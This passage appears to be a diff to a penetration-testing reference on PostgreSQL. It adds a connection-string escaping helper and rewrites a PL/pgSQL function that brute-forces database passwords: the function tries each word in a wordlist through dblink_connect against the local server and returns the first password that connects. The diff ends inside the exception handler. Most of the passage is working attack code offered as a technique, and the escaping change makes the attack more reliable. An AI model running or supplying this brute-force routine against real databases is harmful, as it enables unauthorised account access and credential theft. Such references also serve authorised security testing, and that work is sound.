@@ -303,23 +303,35 @@ Use procedural language to brute force database passwords.
 
 **Alternative:** If dblink is unavailable, `postgres_fdw` can be used with similar connection-testing logic, but requires its own setup (CREATE SERVER, CREATE USER MAPPING) and different privilege requirements.
 
+**Connection String Injection Warning:** When building libpq connection strings dynamically, values containing spaces, quotes, or backslashes must be escaped. The helper function below escapes values per libpq rules (backslash-escape `\` and `'`, then wrap in single quotes).
+
 ```sql
 -- Ensure dblink extension is available
 CREATE EXTENSION IF NOT EXISTS dblink;
 
--- Create brute force function
+-- Helper: escape a value for libpq connection strings
+-- (backslash-escape \ and ', then wrap in single quotes)
+CREATE OR REPLACE FUNCTION escape_connstr_value(val TEXT)
+RETURNS TEXT
+LANGUAGE sql IMMUTABLE AS $$
+    SELECT '''' || replace(replace(val, '\', '\\'), '''', '\''') || ''''
+$$;
+
+-- Create brute force function with safe connection string building
 CREATE OR REPLACE FUNCTION brute_force(target_user TEXT, wordlist TEXT[])
 RETURNS TEXT
 LANGUAGE plpgsql AS $$
 DECLARE
     pwd TEXT;
-    result TEXT;
+    connstr TEXT;
 BEGIN
     FOREACH pwd IN ARRAY wordlist LOOP
         BEGIN
-            -- Try to connect with password
-            PERFORM dblink_connect('host=127.0.0.1 dbname=postgres user=' ||
-                                   target_user || ' password=' || pwd);
+            -- Build connection string with escaped values
+            connstr := 'host=127.0.0.1 dbname=postgres user=' ||
+                       escape_connstr_value(target_user) ||
+                       ' password=' || escape_connstr_value(pwd);
+            PERFORM dblink_connect(connstr);
             PERFORM dblink_disconnect();
             RETURN 'Found: ' || pwd;
         EXCEPTION WHEN OTHERS THEN
